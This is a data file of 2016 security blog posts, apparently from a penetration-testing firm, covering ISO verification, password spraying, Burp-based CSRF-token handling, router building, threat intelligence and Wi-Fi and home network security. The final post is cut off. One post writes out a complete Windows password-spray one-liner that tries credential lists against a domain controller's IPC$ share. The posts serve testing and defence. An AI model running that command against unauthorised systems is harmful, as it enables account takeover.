        "output": "Title: \"Check Your Image\"\nTaxonomies: \"How-To, Image, Linux, Linux Mint, Vulnerabilites\"\nCreation Date: \"Wed, 24 Feb 2016 22:06:41 +0000\"\nLawrence Hoffman //\n\nToday I\u2019ll walk through the process I use to verify ISO images before I install them.\n\nIf you downloaded Linux Mint 17.3 Cinnamon on February 20th there\u2019s some chance that you obtained an ISO with malware installed. The Linux Mint team posted notification on their blog on February 21st at around 2:00 am that they\u2019d discovered their website had been compromised and that the official package had been replaced by a malicious version of the operating system. The hacked ISO was being hosted at absentvodka.com and there are a few names related to the Bulgarian based website which the Mint team has said they may launch investigation against.\n\nFollowing the attack the site was brought down so as to avoid serving malicious ISO files. In comments on the original announcement members of the Mint team identified the site\u2019s Wordpress blog as the attacker's point of entry. Prior to the announcement a dump of the linuxmint.com website was made available on TheRealDeal for $85. At least one individual purchased this and posted the config files on HackerNews.\n\nFor the intensely curious the malicious code is available in this gist:https://gist.github.com/Oweoqi/31239851e5b84dbba894 it appears to set up a bot net.\n\nSo, how can the user avoid this kind of threat? Well, first off is the recognition that regardless of the technical knowledge, professionalism, and good intentions of those providing a product, we must assume that the product could possibly be compromised. For those reasons it is on the consumers to take whatever steps we can to verify that the product we\u2019re obtaining is the product we think it is. There are a few steps that I typically take to verify operating system images before use. What follows is pretty paranoid, and uses an Arch Linux distro as an example. My goal here is twofold: one, know the system I\u2019m installing and the current issues, and two, get multiple independent verifications that what I\u2019m about to install is legitimate.\n\nBe aware of what vulnerabilities are known for the OS you\u2019re considering installing. Arch Linux lists their CVEs here (https://wiki.archlinux.org/index.php/CVE), most big distros do this, I also use CentOS, for that I check CVEs here (https://access.redhat.com/security/security-updates/#/). Reading through we can see that both have some unpatched (at the time of this writing) namely the glibc vulnerability that has been in the news as of late.Next is the checksum. We can download our file now, for Arch Linux there\u2019s a huge number of mirrors, usually I select one in the United States and have a look at who the hosting party is. In this case I\u2019ll choose kernel.org. Once over to kernel.org we see that we\u2019re actually in a directory containing the images, and the signatures, and another set of checksums.\n\nIn this case I\u2019ll download the x86_64 tarball from kernel.org. Call me paranoid, but what if a malicious entity had obtained access to both kernel.org and Arch Linux (probably unlikely, but not impossible) so rather than downloading the signatures and checksums from kernel.org I\u2019ll go over to aggregate.org, another mirror on the list and download the SHA1 sums there. This is what the sha1sums.txt contains:\n\nOkay. Now let\u2019s check em. I simply grep for the sha1sum from the file, and I can see that they do in fact match.\n\n A similar command can be run to check the md5 sum. Note that before checking the MD5 I went and got that file from yet another download mirror (this time pair.com).\n\nFinally we\u2019ll check the signature. Moving to another site in the mirror list I pick up the signature to check it. This time I selected ocf.berkley.edu and downloaded the signature file to my local machine.\n\nAs seen above I first attempted to check the sig with gpg --verify, it assumed the correct file to check, and couldn\u2019t find the key in my gpg keychain. So I imported the key with gpg --recv-keys and the key id. The rerun shows that the signature is in fact verified. You can see a time break between when I first attempt verification and when I pull the key, during that time I was googling the key id to see if there were any fishy results.\n\nSo now we can move on with the installation of our ISO. I also recommend that if an integrity check is available for your installation media you run that before install. Arch Linux is a rolling distribution so I go through this kind of verification each time I do an install. With other OSs like CentOS, Ubuntu, etc. which are versioned, I will usually download one image, verify it, and then encrypt it and back it up so that I have a known good image to install from in the future for that particular version.\n\nBonus section: For work, when I\u2019m super paranoid, and the image is some new hacking tool, or something we\u2019re testing out for another company I\u2019ll actually start the image in an airgap, then plug it into a mirrored switch and pull all of the traffic off of it for a while to see if it attempts to map drives, ping outbound to someone else\u2019s network, or go grab software I didn\u2019t ask for. Beau Bullock has also mentioned to me that he likes to run a vulnerability scan on it after install, which will point out which components of the system may be misconfigured from an outside perspective. This makes a lot of sense, it doesn\u2019t have to mean that the image was intentionally made malicious, just that someone forgot to update package x before signing off on the image.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Check Your Tools\"\nTaxonomies: \"Author, Brian King, Password Spray, Red Team, bad passwords, password, passwords\"\nCreation Date: \"Fri, 26 Feb 2016 22:10:27 +0000\"\nBrian King //\n\nThere\u2019s a one-liner password spray script that a lot of folks use to see if anyone on a domain is using a bad password like LetMeIn! or Winter2015. It reads a list of users from a file, a list of passwords (or just one password, if you\u2019ve got a healthy streak of paranoia about account lockouts) from another, and uses them to try to connect to the IPC share on a domain controller.\nLike most one-liners, it\u2019s easy to ruin the whole thing while substituting in the customer-specific parts. So, it\u2019s good to test it on your own user account before you run it against the whole domain. If it finds your password (which you\u2019ve given it) then you\u2019ve got the syntax right, and it\u2019ll find the others, too.\nOn a recent engagement, it didn\u2019t work out that way. The sanity check failed to find the test account\u2019s password, even though it was in the file to try. What followed was a lesson in paying attention, figuring out why things worked the way they did, and some manual reading.\nThe first steps in troubleshooting are to describe the problem clearly, then narrow a test case down to the smallest number of variables.\n\n \n\nProblem: Test Fails with Valid Credentials\n The whole command looks like this:\n@FOR /F %p in (password.txt) DO @FOR /F %n in (users.txt) DO @net use \\\\dc1\\IPC$ %p /user:CORP\\%n 1>NUL 2>&1 && echo [*] %n:%p && @net use /delete \\\\dc1\\IPC$ > NUL\nThere\u2019s a lot going on there, and \u2013 like most one-liners \u2013 it\u2019s not obvious where a failure might happen. To make that a bit more readable:\n @FOR /F %p in (password.txt) DO\n @FOR /F %n in (users.txt) DO\n   @net use \\\\dc1\\IPC$ %p /user:CORP\\%n 1>NUL 2>&1\n   && echo [*] %n:%p\n   && @net use /delete \\\\dc1\\IPC$ > NUL\nThat is:\nFor each line in the file password.txt, set the %p variable.\nFor each %p variable, set the %n variable from the next line in the users.txt file.\nTry to connect to the IPC$ share on a domain controller, and ignore the output.\nIf the connection succeeded, write a string to stdout with the username and password that worked.\nAnd then if that worked, disconnect.\nNow that the whole thing is clear, it\u2019s time to narrow things down. Start at the beginning: try reading one line from a test file, and writing it to stdout. This will make sure we\u2019re reading the files correctly. Maybe it\u2019s a problem with line ending sequences or character encoding, or maybe I\u2019m not remembering how to pass a filename on the command line. Could be anything.\n\nUm\u2026\nOK. That was quick. The problem is that I\u2019m only getting the first word on the line, not the whole line. I thought when you gave it a file, it would read it line by line. Time to Read The Fine Manual.\n\nWait, what?\n\u201c\u2026breaking it up into individual lines of text, and then parsing each line into zero or more tokens\u2026\u201d That was unexpected.\nTab and space are the default delimiters, but I can specify something else, so I need something that\u2019s not in my password. This\u2019ll work:\n\nYes, that works.\nBut can I be sure that I\u2019ll never want to try a password with a plus in it? How about the null character?\n\nNope.\nHow about the null string?\n\nYay!\nNow that I know it was spaces causing the problem, I know what the next problem will be: I have to quote anything with a space in it for use on the command line. This is why lazy hackers like me still try to avoid spaces in filenames. Saves all that tedious quoting. So \u2013 do I need to quote that %p when it\u2019s used as output in the script? Let\u2019s find out:\n\nQuotes, Please.\nIt worked when I quoted it, and failed when I didn\u2019t. So we\u2019ll be quoting from here on out.\nSo, the new, more resilient password spray one-liner now looks like this:\n@FOR /F \u201cdelims=\u201d %p in (password.txt) DO @FOR /F \u201cdelims=\u201d %n in (users.txt) DO @net use \\\\dc1\\IPC$ \"%p\" /user:CORP\\%n 1>NUL 2>&1 && echo [*] %n:%p && @net use /delete \\\\dc1\\IPC$ > NUL\nI should really keep that someplace where I can find it.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Using Recursive Grep to Test Per-Request CSRF-Token Protected Pages\"\nTaxonomies: \"David Fletcher, Red Team, Web App, Cross-Site Request Forgery, CSRF, CSRF-Token, Recursive Grep, Testing Protected Pages, XSRF\"\nCreation Date: \"Mon, 07 Mar 2016 22:24:33 +0000\"\n\nDavid Fletcher //\n\nCross-Site Request Forgery (CSRF or XSRF) is an attack which is used to execute a transaction on behalf of a victim user against a vulnerable web application. To be vulnerable to CSRF, an attacker must be able to determine and submit all of the values necessary to execute the target transaction in advance. If this is possible, an attacker will use social engineering, craft a malicious URL, or post a malicious form on a third party site that will accept unfiltered HTML input. When the targeted user executes the attacker\u2019s content, the transaction is executed on the target web application.\nAs a defense against CSRF attacks, web applications employ Anti-CSRF tokens in sensitive forms. The token is a random value that is generated when the target form is loaded, and verified when the form is submitted. Since an attacker cannot know the value in advance and must have the value to successfully submit the form, this technique, when implemented properly, will thwart CSRF attacks.\nSome anti-CSRF implementations change the token value with each submission of the form. A side-effect of this behavior is that automated testing becomes nearly impossible without taking the token value into consideration. In this post I will demonstrate how Burp Intruder\u2019s Recursive Grep payload can be used to solve this problem. Once the Recursive Grep payload is understood it can be used to solve nearly any dependency on a previous server response.\nI recently encountered a WebSphere portal that exhibited the behavior described above. When any form was submitted to the server, multiple values would change in the ensuing response which prevented automated tools like Burp Repeater and Burp Intruder from working properly on the site. The server would simply respond by reloading the blank form with newly updated token values.\nTo demonstrate this problem, I have created a single ASP.NET web form with two fields.  For simplicity, the current token value is displayed on the form. If this form is submitted without the correct token value, the string \u201cInvalid Token Value\u201d is displayed. However, when the correct token value is submitted, the submitted values are reflected on the page along with an indication of success.\n\nBasic Form with Token Value Displayed\n\nToken Validation Error\n\nSuccessful Form Submission\nIf no compensation is made for the token value, when Burp Intruder is run trying to tamper the form fields we see the following results. This is because the token is changing with each request and being validated when the form is submitted. Since the values don\u2019t match, none of the requests is successful.\n\nUnsuccessful Intruder Attack Due to Invalid Token Value\nTo accommodate for the token value present in the response, we can use the Burp Intruder Recursive Grep payload. This payload will formulate and insert a parameter into your request based on the previous server response. The derived parameter can originate from any arbitrary location in the response and you can include as many recursive grep payloads as you need. While testing the WebSphere portal mentioned above, there were three distinct values that changed with each response from the server.\nIn order to use the Recursive Grep payload, we must make some adjustments to our standard Intruder Attack setup. In the instance above, I simply selected the txtFName parameter, specified a sniper attack using the simple list payload and selected the default Burp username list.\nUsing Recursive Grep requires us to select either the Pitchfork or Cluster Bomb attack type. Since we are tampering only one parameter, the Pitchfork attack makes sense. This attack will stop when the shortest list is exhausted. With multiple significant parameters, this attack treats the values in each list as a tuple.  In contrast, the Cluster Bomb attack tests each of the possible permutations generated by each list. Our setup can be seen below. The target field (txtFName) and token (checkToken) are identified as payload positions and the Attack Type is Pitchfork.\n\nIntruder Attack Setup with Parameter and Token Payload Positions\nSince the target field appears first in the request we select simple list as the payload type and specify the Burp username list as described earlier.\n\nSimple List Payload Configuration\nThe second field is our checkToken value. In this case we desire a Recursive Grep payload but first we must set up the Grep location. To do so we have to navigate to the options tab and scroll down to the \u201cGrep Extract\u201d location in the form.\n\nBurp Intruder Grep Extract\nOnce there, click the add button to add an extract location. On the ensuing form, scroll down in the HTTP response body and highlight the CSRF token value.  This identifies the location in the previous response that Burp will use for the Burp Recursive Grep payload.\n\nGrep Extract Location Selection\nOne final adjustment on the Options tab is required to ensure that the recursive grep works properly. Since there is a direct relationship between the previous response and the current request, the number of threads must be set to 1.\n\nBurp Intruder Attack Request Engine Options\nWith intercept enabled on the proxy, submit the form to capture the current token value. This is required to seed the Recursive Grep payload and will be used to begin the intruder attack.\n\nIntercepted Post with Current Token Value\nNow, return to the Burp Intruder attack and select the Payloads tab.  Select the appropriate payload index and select the Recursive Grep payload type. You should see the Grep Extract entry that you created above. Select this value and paste the current token value into the \u201cInitial payload for first request\u201d field.\n\nRecursive Grep Payload Options\nWith all of our options set, we can finally execute our Intruder Attack. Since the \u201ccheckToken\u201d parameter was selected as a tampered value, we can see the submitted value in our attack. In addition, because of the requirement for a Grep Extract to facilitate the attack, we can see the value returned in the previous form submission. Inspecting the output, we can see that the response indicates success, the word invalid no longer appears in the output, and that the token values cascade from response to request as expected.\n\nSuccessful Intruder Attack Results\nHopefully this post will be valuable if you encounter behavior like this. While the Recursive Grep payload is effective against some Anti-CSRF behavior, it is not a one size fits all solution.\nWithin the same WebSphere portal that forced me to investigate the Recursive Grep payload there were multi-step form submissions that this feature just couldn\u2019t handle. These forms involved multiple posts to the same location. Each post generated new token values which had to be submitted in sequence. One set of tokens would activate the form and the next would submit. Without the first, the page would simply reload without the active form.\nI am currently investigating a solution to this problem and have started a Burp Extension to address it.  Look for this capability in a future post\u2026\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to create a SOHO router using Ubuntu Linux\"\nTaxonomies: \"Author, How-To, Joff Thyer, soho router, ubuntu linux\"\nCreation Date: \"Fri, 04 Mar 2016 15:42:00 +0000\"\nJoff Thyer //\n\nThis post is cross-posted from Packet Header on 3/1/16. \n\n__________   \n\nOn Security Weekly Episode 452, I presented a technical segment on how to build your own small office/home office wired router. This blog post will list of the essential components, and expand upon the technical segment. Our goal is to build a multi-segment wired router that performs Network Address Translation (NAT) with IPv4, runs Internet Software Consortium (ISC) Bind9 for domain name service, and ISC DHCP services to deliver IP addresses on the inside of your network.   \n\nNOTE: Supporting configuration files associated with this blog post can be found at https://bitbucket.org/jsthyer/soho_router. \n\nFrom a hardware standpoint, you can choose any dual NIC or higher computer that will support an Ubuntu 14.04.4 LTS server installation. I would recommend a minimum of 1024MB (1GB) of RAM, and 16GB of hard disk space. Some hardware that I have found useful includes the Soekris Net6501 (http://soekris.com/products/net6501-1.html), or the Netgate RCC-VE 2440 (http://store.netgate.com/ADI/RCC-VE-2440.aspx). The starting point for building the router is to install Ubuntu-14.04.4 LTS server (64-bit), and then install the following additional packages: \n\napt-get install bind9\n\napt-get install isc-dhcp-server\n\napt-get install ntp\n\nThe next and very important step is to ensure that IP forwarding is turned on in your kernel. If you don\u2019t do this, you don\u2019t route any packets and the game is over. In order to enable IP forwarding, please add the following lines to the bottom of the /etc/sysctl.conf file, and reboot your system. Note that while we at changing the system configuration, we will disable IPv6 since you are probably not using it.\n\n /etc/sysctl.conf   \n\nThe core of the configuration for a router is to make sure that your network interfaces are configured properly, and that your IPTABLES configuration is set up to properly translate, and forward traffic to the Internet.   \n\nNetwork Interface Configuration   \n\nStarting with network interfaces, we will assume that your public Internet address can either be static or obtained via DHCP. We will assign the Linux network interface \u201ceth0\u201d to be the Wide Area Network (WAN) connection to your Internet Service Provider. Just for demonstration purposes, we will assume a static Internet address of 255.1.1.2 and a network mask of /30. Your ISP\u2019s device will be assigned 255.1.1.1. Your public network subnet mask is calculated using the following math:  subnet mask = 2^32 - 2^(32-30) \u21d2 255.255.255.252 in dot quad notation. We will also assume that you have a total of four network interfaces on your router device which will yield up to three internal network segments. Listed below is the top section of what will be the /etc/network/interfaces file. This not only contains the \u201ceth0\u201d definition, but also contains some additional security features in the form of \u201cnull routes\u201d for any RFC1918 network traffic that appears with a shorter prefix than the connected interfaces, and also routes multicast (224.0.0.0/4) to the bit bucket. If you need to use DHCP for your Internet public address, you can un-comment the marked entries for the \u201ceth0\u201d interface that starts with \u201cusing dhcp\u201d, and comment out the static address part. One more aspect is that the iptables rules are expected to be listed in /etc/iptables.rules.  More about this later in the article.   \n\n /etc/network/interfaces   \n\nNow we need to establish what the internal/inside interfaces of our network look like. For simplicity, we will use class C (/24) networks and assign them the addresses 10.1.1.0/24, 10.1.2.0/24, and 10.1.3.0/24 respectively. This is how you configure the remainder of the /etc/network/interfaces file to reflect this.   \n\n /etc/network/interfaces   \n\nIPTABLES Rules Configuration   \n\nAs listed in the network interfaces configuration file, we are going to create the file /etc/iptables.rules, and depend upon the networking code to load the configuration when the system boots. We can also test our iptables configuration at any time using the \u201ciptables-restore\u201d command. The IPTABLES configuration is broken into two sections, these being the Network Address Translation and the Filtering section. In short, performing Network Address Translation with IPTABLES is a one-liner. In this example, we assume that the internal network is addressed in the 10.0.0.0/8 range and that the public Internet Protocol address (WAN interface) is configured on \u201ceth0\u201d. As a bonus, and if you want to run the Squid web proxy, there is a line to rewrite traffic on internal network segments destined to TCP port 80 to the standard Squid TCP port of 3128.   \n\n NAT section of /etc/iptables.rules   \n\nHaving created the NAT section of the iptables ruleset, you are still required to create the filtering rules to determine what is going to ingress and egress your actual gateway router system, as well as determine what traffic will forward across your router. I am going to break the filter section of the IPTABLES rules down into multiple different parts of this article, these being: \n\nTraffic being received by the router (INPUT)\n\nTraffic being sent by the router (OUTPUT)\n\nTraffic being forwarded across the router (FORWARD)\n\nTraffic being logged by the router (LOG_DROPS)\n\nWe will start the filtering section of the IPTABLES configuration by adding a \u201cLOG_DROPS\u201d chain to the ruleset. This will allow us to write logs on any traffic that is dropped. After that, we will implement some common sense network protections for the router itself which include: \n\ndropping any traffic to \u201ceth0\u201d that sources from 0.0.0.0/8\n\ndropping any traffic to \u201ceth0\u201d that sources from RFC1918 addresses\n\ndropping any traffic to \u201ceth0\u201d that sources from a multicast address (224.0.0.0/4)\n\ndropping fragmented IP traffic\n\ndropping ingress packets that have an IP TTL less than 4.\n\ndropping any packets destined to TCP/UDP port 0.\n\ndropping any packets with all or no TCP flags set\n\n Starting portion of \u201cfilter\u201d section. Common sense protections. \n\nIn the next part of the INPUT section, we are defining the following rules for the router to receive traffic as follows: \n\nAccept all traffic to the Loopback interface. A lot of software will use Loopback for internal communications and it is better to not break things. \n\nAccept traffic for the Domain Name Service (DNS) bind9 server on any interface. This is needed because we are running bind9 on the router itself, and we might likely decide to host some of our own DNS zones. \n\nAccept specific traffic from our internal network. This includes DNS, DHCP server requests, network time protocol, and Squid traffic (if you choose to run Squid). \n\nAccept internet control message protocol (ICMP). \n\n Packet input/ingress (to router) section of \u201cfilter\u201d section   \n\nIn the OUTPUT section, we need to the router to forward all traffic to the Loopback interface, and then we need to define rules for the router itself to transmit to the internal network, and the Internet as follows: \n\nTransmit DNS traffic to any host on any network. \n\nAllow the router to perform \u201cWHOIS\u201d queries on TCP port 43, and allow for Ubuntu software updates across HTTP/HTTPS. \n\nAllow the router to perform Network Time Protocol queries. Allow the router to transmit DHCP INFORM packets on the internal network. \n\nAllow the router to transmit ICMP packets on the internal network. \n\n Packet output/egress section (from router) of \u201cfilter\u201d section   \n\n Now we accept state-related packet flows and then drop and log anything else. \n\nThe FORWARD section of the IPTABLES rules determines exactly what traffic is able to flow (be forwarded) across your router. It is important to not confuse this section with the INPUT/OUTPUT portions of the rules. The FORWARD section is where the magic happens to get packets from your internal network to the Internet. In this example, we have a fairly liberal policy which allows all IPv4 TCP, UDP, and ICMP traffic to the Internet and accepts any state-related traffic.   \n\n Packets that will be forwarded across the router interfaces \n\nAs a final step in our configuration, we log all dropped packets to the syslog LOCAL7 facility. The idea being that we can configure \u201crsyslog\u201d with a rule that matches this prefix and writes the logging data to a file.   \n\n Finally, we log things by prefixing \u201ciptables:\u201d to the syslog data flow. \n\nFor extra information, here is the \u201crsyslog\u201d configuration file I use to log the data.   \n\n /etc/rsyslog.d/30-iptables.conf   \n\nDHCP and DNS Services   \n\nNow we have covered the essential core components of forwarding packets, we can talk about DHCP and DNS. Starting with DHCP, what we need to do is provide basic IP address service on our three internal network segments. On each segment, we will start with a lower address at x.x.x.50 so we can reserve a little static address space for other miscellaneous uses. We will also set up lease times for 30 days (30 * 86400 seconds). Addresses will be provided on all three internal network interfaces (eth1, eth2, and eth3). This file is to be saved as \u201c/etc/dhcpd/dhcp.conf\u201d.   \n\n /etc/dhcp/dhcpd.conf   \n\nWith regard to bind9 (DNS services), the default Ubuntu installation will yield a caching name server which utilizes the Internet root caching servers, and is sufficient for most purposes. The extension some people may want to consider is to forward queries to a DNS filtering service (such as OpenDNS), and/or run some specific filtering on your own. In my case, I leverage the \u201cdshield\u201d bad domain lists which as maintained by Johannes Ulrich of the SANS Institute. An example of how to configure bind9 to forward all queries to an upstream DNS server is listed below. The configuration screenshot below is a modification to the \u201c/etc/bind/named.conf.options\u201d file to forward all queries to the upstream Google DNS server of 8.8.8.8, and to filter the networks able to perform recursive DNS queries. Forwarding to an upstream server is completely optional, and if you choose this, a trusted DNS filtering service is advisable. Filtering on what clients can make recursive queries should be considered as an essential part of the configuration.   \n\n /etc/bind/named.conf.options   \n\nAs regards the \u201cdshield\u201d bad domains list, I have created a shell script called \u201cget_malware_domains.sh\u201d whose job it is to fetch the URL \u201chttps://isc.sans.edu/feeds/suspiciousdomains_Low.txt\u201d and then convert that list into bind9 configuration file format. An example of the configuration file format is as follows.   \n\n named.conf.dshield file   \n\nThe concept is that any domain listed in this file will be resolved to the address \u201c127.0.0.1\u201d.   \n\nThe \u201cdb.blackhole\u201d file contents. All of the above descriptive text will also be supported by a small tar file containing some of the key file contents described here. Happy hunting! \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"More on Threat Intelligence Feeds\"\nTaxonomies: \"Author, Derek Banks, InfoSec 101, Purple Team, threat intelligence feeds\"\nCreation Date: \"Wed, 02 Mar 2016 15:48:39 +0000\"\nDerek Banks //\n\nJohn\u2019s hating on threat intelligence feeds post got me thinking.  As a former blue team member that is now solidly purple team, I do not hate threat intelligence (sorry, John).  But, I am not going to disagree with John\u2019s take (and not just because he signs my paychecks), because he's right.\n\n\u200b\u200b\n\n \n \nPaying for a feed of blacklisted IP addresses and domain names and ingesting that firehose of data into a security device to detect or prevent it, and slapping a threat intelligence label on it, is not all that effective.  Purchasing the latest super-appliance that promises to stop all advanced attacks before the attacker even thinks about it while drinking his morning coffee is not going to actually going to stop a determined attacker.\n\nIf this is your organization\u2019s idea of what threat intelligence is and how to use it, then you\u2019re doing it wrong.  What you are going to accomplish in that model is either sending out tons of meaningless alerts to information security staff with no context of why something may be bad, or, even worse, blocking access to something for your users when somehow Google.com made it into the threat intelligence feed that you have no control over what goes in it (of course that would never happen, right!?)\n\nSo, then who is threat intelligence good for? For, organizations that already have effective and tested controls in place for basic security issues (such as patching and vulnerability management), and are ready to start actively hunting for attackers in their network.  If your organization has effectively addressed the CIS Critical Controls, then you may be tall enough for the threat intelligence ride.\n\nSo what exactly is threat intelligence?  Vendor XYZ told me that their super-appliance stops all advanced attacks thirty minutes before they even happen using threat intelligence!   As with many things in the computing world, terms to describe technology end up becoming buzzwords used by vendors to sell more products - this definitely seems to be the case with threat intelligence.\n\nTo me there are two categories.  The first is Atomic Indicators of Compromise (IOCs).  These are things that cannot be broken down further into additional data such as IP addresses, domain names, and file hashes.  These are typically what you see in a threat intelligence feed.\n\nAtomic indicators are then used to help describe the next category - Tools, Techniques, and Procedures (TTPs).   This describes the tools an attacker uses, the techniques they employ with those tools, and the procedures they follow to reach a specific goal.  This is generally not what you find in a threat intelligence feed.\n\nFor example:  \u201cWhen this attacker sent an email from the server at this IP address, the malicious attachment with this file hash created a command and control channel to the server at this IP address.  Then the attacker downloaded and used this Remote Access Tool and moved laterally in the internal network over SMB and gathered this type of sensitive data from these systems and used this compression method to package up the data and exfiltrate it to this other IP address.\u201d\n\nWait, this sounds difficult to figure out, how can an appliance do that?!  It is.  Very difficult.  An appliance or feed cannot do that kind of analysis, people do that analysis.  Attackers can change atomic indicators relatively easily.  When they do, the feed does not help detect that attacker any longer until an actual person somewhere does some analysis and adds new data back in.\n\nEffective use of threat intelligence takes a dedicated team of security analysts that have as their only job to detect and respond to potential attackers in your network.  It cannot be done by purchasing an appliance or feed of indicators, given to the one security guy who already is not paying attention to the 3,000-a-day alerts from the un-tuned IDS, because he is trying to figure out why a patch broke 12 workstations in the HR department.\n\nSo now we have a team of people and want to get started with effectively using threat intelligence, where do we begin?  To get started, seek out and become involved with security analyst communities that analyze and share information specific to your industry.  These groups do exist, and data that you get from the analysts that contribute to the intelligence will have more context than a feed from a vendor serving every industry.\n\nAlso, generate your own threat intelligence.  When someone in the C-suite reports an email as suspicious and it turns out that the attachment is a weaponized document, take the time to do some analysis and gain some indicators of your own.  Afterall, the indicators from that one phishing attempt have a much better chance of being someone actually attacking your organization rather than any of the indicators in a feed from a vendor.\n\nNow that you are getting some context to why a particular atomic indicator is bad for your organization, what do you do with it?  I would suggest looking through your log files to see if any has ever been seen before in your network.  Next, put into the appropriate detection device to let you know if you see it in the future, but do so with the realization that the atomic indicator has a relatively short lifespan.\n\nIf it is data that you discovered from your own analysis, contribute it back to the information sharing community that you are now a part of.  Provide the atomic indicators in as much detail as you can on the TTPs the attackers used.  Just one atomic indicator of recent and specific attacker activity could help prevent an incident, but TTPs are harder for an attacker to change and will be valid longer than atomic indicators alone.\n\nThis kind of analysis feedback model with information sharing groups is a much more effective way of actually using threat intelligence to discover attackers in your network and to help others do the same.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Beware Public Wi-Fi Insecurity - Part 1: Reviewing the Neighborhood\"\nTaxonomies: \"Author, General InfoSec Tips & Tricks, InfoSec 101, Jordan Drysdale, free wifi, the dangers of public wifi, wifi\"\nCreation Date: \"Tue, 02 Feb 2016 16:55:08 +0000\"\nJordan Drysdale //\n\nOur community's downtown district is approximately a five block by four block area. There are art stores, toy shops, candy retailers, restaurants, bars and hotels. Significant investment has been made in revitalizing and adding an area called \"Main Street Square.\" Almost all of these businesses offer some form of public wireless network, whether it is wide open or \"protected\" by some pre-shared key.\n\nAs a network contractor paid by many of these businesses to keep track of their networks over the last several years, I have witnessed calamity and chaos come to life. Walking through our city's center, there were just short of 500 radios broadcasting some form of wireless signal. About 200 SSIDs were wide open and another 40 or so were running WEP or WPA. WPS is also way too common on the streets; considering Reaver, Bully and various other applications are designed to pull passwords from this protocol. For those WPA2 networks, the majority are broadcasting a name similar to CompanyName_Staff. While every business in our downtown district is swiping credit cards and signing off their PCI SAQs, gathering this amount of data clearly shows a lack of regard for even simple security.\n\nIn connecting to a few of these public Wi-Fi networks, the problems with one deployment seem to span the entirety. \"Client Isolation\" appears to the check box that every installer misses when deploying these networks. If a client device is infected or malicious, they have access to every other client attached to these public networks. Another common flaw in design (and failure in PCI compliance) is to change the default credentials on the Wi-Fi device providing access. Without knowledgeable technicians deploying these Wi-Fi devices, guest users now have access to these internal business networks as if they were connected directly. Business owner beware: your guest wireless is probably a threat to your internal network\nA local ISP in our area asked our city council for the privilege of deploying what they believe to be \"City Wide Wi-Fi.\" After tentative approval, the ISP then offered our mutual client something like \"...better bandwidth, second internet line, you will not have to worry about your guest Wi-Fi anymore, and we spend lots of money sponsoring downtown stuff\u2026.\" Our client went ahead and approved the installation against our recommendations.\n\nDue to the nature of our relationship with this client, we were given the privilege to \"investigate.\" A quick device scan was run after connecting as a public Wi-Fi guest. The other clients on the public Wi-Fi network were reachable, meaning simply that \u201cguest isolation\u201d was not enabled and any miscreant or infected device could steal data. We also determined the ISP\u2019s Wi-Fi device was using a DHCP lease from the internal network. This internal DHCP address was used to NAT guest wireless users out to the internet over the internal business network. Finding other internal devices was trivial at this point. We were able to access a firewall login page and create a Remote Desktop session to their Exchange server. The bottom line here is that this is not an acceptable solution for 21st century Wi-Fi deployments.\nPublic Wi-Fi insecurity represents another facet of the seemingly insurmountable deficit of basic IT security knowledge. Business owners have zero idea whether or not the firms they hire to install new solutions understand access controls, routing, firewall zoning or any of the other fundamental requirements of deploying public Wi-Fi properly (or even what firewall zone based access controls are)!\n\nSo how do we as IT Professionals assist the general business community make better decisions regarding their wireless networks? First - Small Office, Home Office [SOHO] products are generally not an acceptable solution for providing guest Wi-Fi. If your vendor is installing something you can purchase at Best Buy, you should express concern. Second, be very aware of guest access privileges. If they have too much privilege you may be responsible for providing the medium (wireless) over which data theft occurs. Lastly, awareness matters. If we, as IT Pros, can expand the understanding of basic security, we can improve the results of \u201cReviewing the Neighborhood.\u201d\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Secure Your Home Network\"\nTaxonomies: \"General InfoSec Tips & Tricks, InfoSec 101, home network, how to secure a network, securing a network\"\nCreation Date: \"Fri, 18 Mar 2016 21:49:55 +0000\"\n Katherine MacMillan //\n\nSomething interesting happened last week. A programmer by the name of Matthew Garrett gained access to the lighting and window controls to nearly every room of a hotel he was staying in. (You can read his post here:http://mjg59.dreamwidth.org/40505.html#cmt1611577) This made me think about network connected devices and home network security. I, too, have smart lights, and call me paranoid, but I don\u2019t want someone gaining access to my systems. Apart from the annoyance of them being \u201cfunny\u201d and changing my lights randomly, it could give them insight to when I\u2019m awake, and when I\u2019m home. (Granted, if they sat in a car near my house and watched long enough they would get the same information, but that\u2019s more work, and probably not worth it. Simply accessing a network and having that information, that\u2019s a little easier.)\nBeyond just lights though, many homes are increasingly gaining various wi-fi connected features and controls which could be potential vulnerabilities if the network were not properly secured. There are devices that will control your lights, your tv, your music, phone and more. There are home security systems that will allow you to set up cameras that can be streamed to your phone. All of this information, all of these systems on your network, means it\u2019s important to be secure, but what does that even mean?\nBack in the bad-old days, when wi-fi was in its youth, it was easy to login to your neighbors wifi, maybe \u201cborrow\u201d his printer for a laugh. I had friends who would drive around with a laptop looking for open networks to connect to. Luckily, times have changed and people have become a little more responsible with their home networks. Most people go in and set up their network SSID and password protect it, which is a first big step to keeping interlopers out. But is this enough?\nAs I read about Matthew\u2019s (somewhat) misadventure, I began to wonder how secure my simple password protected network is. A smart man once said that security is an ongoing thing, it\u2019s continual, and we have to be vigilant. That being said, there are some simple, and sometimes obvious things we can do to help make our home networks a little more unappealing to those who would try to gain access to them.\nThe Device\nUse a device that supports Wi-Fi Protected Access 2 (WPA2), preferably with Advanced Encryption Standard (AES). This will encrypt communication between the router and device, and is currently the most secure configuration for home networks.\nThink about the placement of your router. The device will emit signals, which can extend beyond the home. By optimizing the location of the antenna in the house, you can minimize how much of that signal is exposed for outsiders to pick up on. You can also fine tune the transmission levels and signal strength to this end. It\u2019s also a good idea to update the router\u2019s firmware since updates often contain patches for previously discovered vulnerabilities.\nThe Settings\nMost routers have a web browser based interface which can be accessed by typing the router\u2019s IP address into the browser address bar. From here you can improve your security by making some small changes to a few settings.\nRouters come with some default settings, which are publicly known, so it\u2019s important to change these to something unique,  making it more difficult to gain access. Give your network a name (SSID) and a passphrase. I say phrase because something long is best. A long phrase, 16 characters or more, is harder to crack than a short, but \u201ccomplex\u201d phrase. (long and complex is even better!)\nIt\u2019s not a bad idea to change your router\u2019s IP and interface login password, the defaults are public knowledge and this will make it so that an attacker can\u2019t just plug in the defaults to gain access. (Make them work for it!)\nTurn 